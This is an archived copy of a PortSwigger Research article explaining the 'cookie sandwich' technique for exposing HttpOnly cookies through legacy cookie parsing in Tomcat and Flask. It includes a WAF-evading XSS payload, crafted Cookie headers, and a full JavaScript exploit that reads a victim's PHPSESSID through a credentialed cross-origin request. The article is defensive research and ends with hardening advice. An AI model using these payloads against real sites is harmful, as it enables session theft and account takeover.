@@ -1,0 +1,124 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Stealing HttpOnly cookies with the cookie sandwich technique</title>
+<style>
+  body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; line-height: 1.55; color: #e2e8f0; max-width: 800px; margin: 26px auto; padding: 0 18px; background: #0a0e27; }
+  h1 { color: #00d9ff; margin-bottom: 0.35em; line-height: 1.22; font-size: clamp(1.45rem, 2.1vw, 1.95rem); font-weight: 700; }
+  h2, h3 { line-height: 1.28; margin: 1.1em 0 0.45em; }
+  .metadata { color: #94a3b8; font-size: 0.86em; margin-bottom: 1.2em; border-bottom: 1px solid rgba(0,217,255,0.2); padding-bottom: 0.7em; }
+  img { max-width: 100%; width: auto !important; height: auto !important; object-fit: contain !important; border-radius: 8px; display: block; margin: 0.6em auto; }
+  a { color: #00d9ff; }
+  p { margin-bottom: 0.72em; line-height: 1.58; }
+  ul, ol { margin: 0.5em 0 0.9em 1.1em; }
+  li { margin: 0.18em 0; }
+  blockquote { border-left: 3px solid #825ee4; padding-left: 12px; margin: 0.8em 0; color: #94a3b8; }
+  code { background: rgba(0,0,0,0.3); padding: 2px 6px; border-radius: 3px; color: #ff79c6; }
+  pre { background: rgba(0,0,0,0.4); padding: 12px; border-radius: 6px; overflow-x: auto; }
+  .article-elevator { position: fixed; right: 14px; bottom: 14px; display: flex; flex-direction: column; gap: 8px; z-index: 9999; }
+  .article-elevator-btn { width: 36px; height: 36px; border: 1px solid rgba(0,217,255,0.35); border-radius: 10px; background: rgba(10,14,39,0.88); color: #00d9ff; cursor: pointer; font-size: 16px; line-height: 1; }
+  .article-elevator-btn:hover { background: rgba(10,14,39,1); }
+</style>
+</head>
+<body>
+  <h1>Stealing HttpOnly cookies with the cookie sandwich technique</h1>
+  <div class="metadata">
+    Source: PortSwigger Research | Date: 1/22/2025 3:45:11 PM | Lang: EN |
+    <a href="https://portswigger.net/research/stealing-httponly-cookies-with-the-cookie-sandwich-technique" target="_blank">Original Article</a>
+  </div>
+  <div class="content">
+    <div><div> <div> <p><img alt="Zakhar Fedotkin" src="https://portswigger.net/content/images/profiles/callout_zakhar_fedotkin_114px.png"></p>
+</div> <ul> <li> <p><span></span><strong>Published: </strong>22 January 2025 at 14:45 UTC</p> </li> <li> <p><strong>Updated: </strong>30 June 2025 at 16:01 UTC</p> </li> <li> </li> </ul> <p><img src="https://portswigger.net/cms/images/1b/d8/daba-article-cookie-sandwich.png" alt="Cookie sandwich"></p><p>In this post, I will introduce the "cookie sandwich" technique which lets you bypass the HttpOnly flag on certain servers. This research follows on from <a href="https://portswigger.net/research/bypassing-wafs-with-the-phantom-version-cookie">Bypassing WAFs with the phantom $Version cookie</a>. Careful readers may have noticed that legacy cookies allow special characters to be included inside the cookie value. In this post, we're going to abuse that. <br></p>
+<h2>Cookie sandwich</h2>
+<p> The cookie sandwich technique manipulates how web servers parse and handle cookies when special characters are used within them. By cleverly placing quotes and legacy cookies, an attacker can cause the server to misinterpret the structure of the cookie header, potentially exposing HttpOnly cookies to client-side scripts.
+</p>
+<h4>How It Works:</h4>
+<p> Because the Chrome browser doesn't support legacy cookies, it lets attackers create a cookie name that starts with a <span>$</span>, like <span>$Version</span>, from JavaScript. Furthermore, quotes can be placed inside any cookie value. The following code demonstrates how to create a cookie sandwich to steal a restricted cookie value:<br></p>
+<p><code>document.cookie = <span>`$Version=1;`</span>;
+document.cookie = <span>`param1=</span><span>"start</span><span>`</span>;
+<span>// any cookies inside the sandwich will be placed into param1 value server-side
+</span>document.cookie = <span>`</span><span>param2=end"</span><span>;`</span>;
+</code></p><p>The Cookie header in the request/response might appear as:</p><p><code><span>GET</span> / HTTP/1.1
+<span>Cookie: </span><span>$Version</span>=<span>1</span>; <span>param1</span>=<span>"start</span>; <span>sessionId</span>=<span>secret</span>; <span>param2</span>=<span>end"</span><br> =&gt;<br><span>HTTP/1.1</span> 200 OK
+<span>Set-Cookie: </span><span>param1</span>=<span>"start; sessionId=secret; param2=end"</span>;</code></p><p>A little reminder of how Apache Tomcat processes cookie headers:</p><ul> <li> The parser handles both <a href="https://datatracker.ietf.org/doc/html/rfc6265">RFC6265</a> and <a href="https://datatracker.ietf.org/doc/html/rfc2109">RFC2109</a> standards, defaulting to legacy parsing logic if a string starts with the special <a href="https://github.com/apache/tomcat/blob/4111137da8712add015a4193da0f7d4d9248941e/java/org/apache/tomcat/util/http/parser/Cookie.java%23L147">$Version</a> attribute. </li> <li> If cookie value starts with double quotes, it will continue reading until the next unescaped double quotes char. </li> <li>It will also unescape any character starting with backslash (\).</li></ul>
+<p> If the application improperly reflects the <span>param1</span> cookie in the response or does not have the HttpOnly attribute, the entire cookie string, including any HttpOnly session cookie sent by the browser between param1 and param2 - can be exposed.
+</p><p> Python frameworks support quoted strings by default, eliminating the need for the special <span>$Version</span> attribute. These frameworks also recognize the semicolon as the browser's cookie pair separator, automatically encoding all special characters into a four-character sequence: a forward slash followed by the three-digit octal equivalent of the character. A "cookie sandwich" attack against a Flask application might look like this:
+</p>
+<p><code><span>GET</span> / HTTP/1.1
+<span>Cookie: </span><span>param1</span>=<span>"start</span>; <span>sessionId</span>=<span>secret</span>; <span>param2</span>=<span>end"</span><br> =&gt;<br><span>HTTP/1.1</span> 200 OK
+<span>Set-Cookie: </span><span>param1</span>=<span>"start\073 sessionId=secret\073 param2=end"</span>;</code></p><h2>Real world example</h2>
+<p> Analytics often employ cookies or URL parameters to monitor user actions, and rarely validate the tracking ID. This makes them a perfect target for the cookie sandwich attack. Typically, when a user first visits a site, the server creates a random string <b>visitorId</b> and stores it in cookies. This <b>visitorId</b> is then shown on the webpage for analytics:
+</p>
+<p><code>&lt;<span>script</span>&gt;
+{<span>"visitorId"</span>:<span>"deadbeef"</span>}
+&lt;/<span>script</span>&gt;
+</code></p><p> This scenario creates a vulnerability. If an attacker can access the webpage content - perhaps through a <a href="https://portswigger.net/web-security/cors">CORS</a> request with credentials or an XSS attack on the same origin - they can bypass the HttpOnly cookie flag, exposing sensitive user information.
+</p>
+<h3>Stealing an HttpOnly PHPSESSID cookie</h3><p> In a recent test, I encountered a vulnerable application with a reflected <a href="https://portswigger.net/web-security/cross-site-scripting">XSS</a> vulnerability on an error page. Here’s how I was able to use it to steal an HttpOnly PHPSESSID cookie. The journey involved bypassing some security controls and leveraging an overlooked tracking domain vulnerability.
+</p>
+<h4>Step 1: Identifying the XSS Vulnerability</h4>
+<p> The vulnerable application reflected certain link and meta attributes without proper escaping. This allowed me to inject JavaScript code, as the server didn’t properly sanitize the user input. While AWS WAF was in place, it could be bypassed due to an unpatched event <a href="https://x.com/garethheyes/status/1854191120277733760">oncontentvisibilityautostatechange</a>. Thanks to <a href="https://x.com/garethheyes">@garethheyes</a> who helped me with that trick:
+</p>
+<p><code>&lt;<span>link</span> <span>rel</span>="<span>canonical</span>"<br><span>oncontentvisibilityautostatechange</span>="<span>alert(1)</span>"<br><span>style</span>="<span>content-visibility:auto</span>"&gt;
+</code></p><h4>Step 2: Finding the Exposed Cookie Parameter</h4><p> Once I confirmed that I could run custom JavaScript on the page, my next objective was to locate an HttpOnly cookie associated with the domain. Initially, I didn’t find any directly accessible analytics JavaScript, but I discovered a tracking domain that reflected the session ID parameter in the JSON response body. This tracking endpoint accepted a session parameter in the URL, as shown below:
+</p>
+<p><code><span>GET </span>/json?<span>session</span>=ignored HTTP/1.1<br><span>Host: </span>tracking.example.com
+<span>Origin: </span>https://www.example.com
+<span>Referer: </span>https://www.example.com/
+<span>Cookie: </span> <span>session</span>=<span>deadbeef</span>;
+</code>
+<code>HTTP/2 200 OK
+<span>Content-Type:</span> application/json;charset=UTF-8
+<span>Access-Control-Allow-Origin:</span> https://www.example.com
+<span>Access-Control-Allow-Credentials:</span> true
+<br>{"<span>session</span>":"<span>deadbeef</span>"}
+</code></p><p>This website is a great candidate to use in our attack because:</p><ul> <li>reflects cookie value in the response body</li> <li>allows cross origin request from vulnerable domain</li></ul>
+<h4>Step 3: Exploiting Cookie Downgrade for Exfiltration</h4>
+<p> This tracking application had an interesting behaviour: although the session URL query parameter is mandatory, the server overwrites its value with the one from the Cookie header. Since the backend runs on Apache Tomcat, I leveraged the phantom <span>$Version</span> cookie to switch to <a href="https://datatracker.ietf.org/doc/html/rfc2109">RFC2109</a> and execute a cookie sandwich attack. However, one critical challenge remained: controlling the order of cookies in the client's request. For the <span>$Version</span> cookie to be sent first, it must either be created earlier or have a path attribute longer than all other cookies. While we cannot control the creation time of the victim's cookie, we can manipulate the path attribute. In this case, the chosen path was <span>/json</span>.
+</p>
+<p> By using a carefully crafted Cookie header, I could manipulate the order of cookies and exploit the reflection vulnerability to capture the HttpOnly <span>PHPSESSID</span> cookie. Here’s an example of the malicious request I used:
+</p>
+<p><code><span>GET </span>/json?<span>session</span>=<span>ignored</span><br><span>Host: </span>tracking.example.com
+<span>Origin: </span>https://www.example.com
+<span>Referer: </span>https://www.example.com/
+<span>Cookie: </span><span>$Version</span>=<span>1</span>; <span>session</span>=<span>"deadbeef</span>; <span>PHPSESSID=secret</span>; <span>dummy</span>=<span>qaz"</span></code>
+<code>HTTP/2 200 OK
+<span>Content-Type:</span> application/json;charset=UTF-8
+<span>Access-Control-Allow-Origin:</span> https://www.example.com
+<span>Access-Control-Allow-Credentials:</span> true
+<br>{"<span>session</span>":"<span>deadbeef; PHPSESSID=secret; dummy=qaz</span>"}
+</code></p><h4>Step 4: Putting It All Together</h4><p>To summarize, here’s the process of the attack:</p><ul><li> The user visits a page containing the <span>oncontentvisibilityautostatechange</span> XSS payload.
+</li><li> The injected JavaScript sets cookies <span>$Version=1</span>, <span>session="deadbeef</span>, both cookies have Path value <span>/json</span> to change cookie order.
+</li><li>Finally the script appends the cookie <span>dummy=qaz"</span>.</li><li> The script then makes a CORS request to the tracking application endpoint, which reflects the manipulated <span>PHPSESSID</span> cookie in the JSON response.
+</li></ul>
+<p>Final exploit:</p><p><code>
+<span>async</span> <span>function</span> sandwich(target, cookie) { <span>// Step 1: Create an iframe with target src and wait for it</span><br> <span>const</span> iframe = document.createElement(<span>'iframe'</span>); <span>const</span> url = new URL(target); <span>const</span> domain = url.hostname; <span>const</span> path = url.pathname; iframe.src = target; <span>// Hide the iframe</span><br> iframe.style.display = <span>'none'</span>; document.body.appendChild(iframe); <span>// Optional: Add your code to check and clean client's cookies if needed</span><br> iframe.onload = <span>async</span> () =&gt; { <span>// Step 2: Create cookie gadget</span><br> document.cookie = <span>`$Version=1; domain=${</span>domain<span>}; path=${</span>path<span>};`</span>; document.cookie = <span>`${</span>cookie<span>}="deadbeef; domain=${</span>domain<span>}; path=${</span>path<span>};`</span>; document.cookie = <span>`dummy=qaz"; domain=${</span>domain<span>}; path=/;`</span>; <span>// Step 3: Send a fetch request</span><br> <span>try</span> { <span>const</span> response = <span>await</span> fetch(<span>`${</span>target<span>}`</span>, { credentials: <span>'include'</span>, }); <span>const</span> responseData = <span>await</span> response.text(); <span>// Step 4: Alert response</span><br> alert(responseData); } <span>catch</span> (error) { console.error(<span>'Error fetching data:'</span>, error); } };
+} setTimeout(sandwich, <span>100</span>, <span>'http://example.com/json'</span>, <span>'session'</span>); </code></p><p> With this method, I could get access to the other user session cookie from the JSON response, leveraging XSS, cookie manipulation, and the tracking application’s vulnerability.
+</p><h2>Recommendation</h2><p> Cookie security is essential for safeguarding web applications against numerous types of attacks. Pay close attention to cookie encoding and parsing behaviours. It's important to comprehend how cookies are processed by the frameworks and browsers you utilise. Note that, by default Apache Tomcat versions <span>8.5.x</span>, <span>9.0.x</span> and <span>10.0.x</span> support the <a href="https://datatracker.ietf.org/doc/html/rfc2109">RFC2109</a>.
+</p>
+<h2>Want to learn more?</h2><p> Be sure to check out our previous blog post on bypassing <a href="https://portswigger.net/research/bypassing-wafs-with-the-phantom-version-cookie">WAFs using the phantom $Version cookie</a>.
+</p><p> For our latest blog posts and security insights, follow us on <a href="https://x.com/portswiggerres">X (formerly Twitter)</a> and <a href="https://bsky.app/profile/portswiggerres.bsky.social">Bluesky</a>, and join <a href="https://discord.com/invite/portswigger">the official PortSwigger Discord</a>.
+</p><p>For more in-depth insights, I highly recommend Ankur Sundara’s blog post, <a href="https://blog.ankursundara.com/cookie-bugs/" target="_blank">Cookie Bugs - Smuggling &amp; Injection</a>.</p> <p><a href="https://portswigger.net/research/articles">Back to all articles</a></p>
+</div></div>
+  </div>
+  <div class="article-elevator" aria-label="Navigation article">
+    <button class="article-elevator-btn" type="button" onclick="scrollToTop()">▲</button>
+    <button class="article-elevator-btn" type="button" onclick="scrollToBottom()">▼</button>
+  </div>
+  <script>
+    function scrollToTop() {
+      window.scrollTo({ top: 0, behavior: 'smooth' });
+    }
+    function scrollToBottom() {
+      window.scrollTo({ top: document.documentElement.scrollHeight, behavior: 'smooth' });
+    }
+    window.addEventListener('message', (event) => {
+      const data = event && event.data;
+      if (!data || data.type !== 'AI_PULSE_SCROLL') return;
+      if (data.direction === 'top') scrollToTop();
+      if (data.direction === 'bottom') scrollToBottom();
+    });
+  </script>
+</body>
+</html>
